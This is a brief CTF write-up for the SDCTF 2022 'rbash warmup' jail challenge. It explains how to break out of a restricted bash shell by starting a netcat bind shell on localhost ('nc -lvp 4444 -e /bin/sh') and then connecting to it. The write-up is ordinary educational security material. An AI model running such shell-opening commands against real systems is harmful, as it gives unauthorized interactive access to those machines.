---
layout: load_md
title: The White Circle | Sdctf 2022 | rbash warmup Writeup
desc: Check out our writeup for rbash warmup for Sdctf 2022 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Sdctf 2022
parent: sdctf_2022
category: jail
challenge: rbash warmup
tags: "jail, twh, rbash, escape"
date: 2022-05-10T00:00:00+00:00
last_modified_at: 2022-05-10T00:00:00+00:00
---


> Solved By : thewhiteh4t

we can use `compgen` to check for available commands

```
compgen -c
```

![](https://i.imgur.com/bLD71b6.png)


another way is to use `echo`


![](https://i.imgur.com/chEZt6C.png)


now the known way of escaping with `nc` is by getting a shell on our “attacker” box but in this challenge we are not allowed to connect to remote machines so we are left with localhost

actually this is more easy…

```
nc -lvp 4444 -e /bin/sh &
```

![](https://i.imgur.com/DmtwlOo.png)


now we can connect to it !


![](https://i.imgur.com/JiBB1By.png)

